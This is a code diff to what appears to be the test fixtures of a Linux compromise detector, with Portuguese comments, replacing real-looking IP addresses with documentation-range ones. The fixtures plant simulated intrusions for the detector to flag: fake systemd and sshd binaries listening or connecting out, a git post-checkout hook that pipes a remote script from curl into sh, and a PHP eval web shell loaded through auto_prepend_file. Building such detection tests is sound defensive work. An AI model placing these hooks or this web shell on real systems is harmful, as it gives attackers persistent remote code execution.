@@ -294,13 +294,13 @@ func init() {
 		Plant: `mkdir -p /usr/local/sbin
 			cp /helper /usr/local/sbin/systemd-resolve-helper
 			ip link set lo up
-			ip addr add 51.91.190.241/32 dev lo
-			/helper listen 51.91.190.241:8443 &
+			ip addr add 198.51.100.241/32 dev lo
+			/helper listen 198.51.100.241:8443 &
 			sleep 0.4
-			/usr/local/sbin/systemd-resolve-helper connect 51.91.190.241:8443 &
+			/usr/local/sbin/systemd-resolve-helper connect 198.51.100.241:8443 &
 			sleep 0.5`,
 		Expect: []Expect{
-			{ID: "net.egress_unowned", Sev: "WARN", Evidence: "51.91.190.241:8443"},
+			{ID: "net.egress_unowned", Sev: "WARN", Evidence: "198.51.100.241:8443"},
 			{ID: "net.egress_unowned", Evidence: "nenhuma lista de reputação"},
 		},
 		// Sem descritor padrão sobre o socket não há shell, e sem saída interna
@@ -326,8 +326,8 @@ func init() {
 		Plant: `mkdir -p /usr/local/sbin
 			cp /helper /usr/local/sbin/systemd-logind-helper
 			ip link set lo up
-			ip addr add 51.91.190.241/32 dev lo
-			/usr/local/sbin/systemd-logind-helper listen 51.91.190.241:41337 &
+			ip addr add 198.51.100.241/32 dev lo
+			/usr/local/sbin/systemd-logind-helper listen 198.51.100.241:41337 &
 			sleep 0.5`,
 		Expect: []Expect{
 			{ID: "net.listener_unowned", Sev: "WARN", Evidence: "41337"},
@@ -356,8 +356,8 @@ func init() {
 		Plant: `mkdir -p /usr/local/sbin
 			cp /helper /usr/local/sbin/sshd
 			ip link set lo up
-			ip addr add 51.91.190.241/32 dev lo
-			/usr/local/sbin/sshd listen 51.91.190.241:22 &
+			ip addr add 198.51.100.241/32 dev lo
+			/usr/local/sbin/sshd listen 198.51.100.241:22 &
 			sleep 0.5`,
 		Expect: []Expect{
 			{ID: "net.listener_unowned", Sev: "CRITICAL", Evidence: "porta é a de SSH"},
@@ -397,7 +397,7 @@ printf '[s3-backup]\ntype = s3\nprovider = AWS\n' > /root/.config/rclone/rclone.
 printf '17 2 * * * root /usr/local/bin/rclone sync /srv/app s3-backup:app\n' > /etc/cron.d/backup
 
 # três chaves: duas de gente do time, uma de automação COM restrição
-printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploChaveDoLex lex@estacao\n' >> /root/.ssh/authorized_keys
+printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploChaveDeTeste ana@estacao\n' >> /root/.ssh/authorized_keys
 printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploChaveDaAna ana@notebook\n' >> /root/.ssh/authorized_keys
 printf 'restrict,command="/usr/bin/rrsync -ro /srv",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploDoBackup backup@nas\n' >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
@@ -489,7 +489,7 @@ cp /helper /usr/sbin/nginx
 sleep 0.5
 
 # a volta, nos dois lugares que a aplicação toca
-printf '#!/bin/sh\ncurl -fsSL http://185.220.101.7/s.sh | sh\n' > /srv/www/.git/hooks/post-checkout
+printf '#!/bin/sh\ncurl -fsSL http://203.0.113.207/s.sh | sh\n' > /srv/www/.git/hooks/post-checkout
 chmod +x /srv/www/.git/hooks/post-checkout
 printf 'auto_prepend_file = /var/www/.init.php\n' > /etc/php/8.2/fpm/conf.d/99-init.ini
 printf '<?php @eval($_SERVER["HTTP_X_INIT"]); ?>\n' > /var/www/.init.php
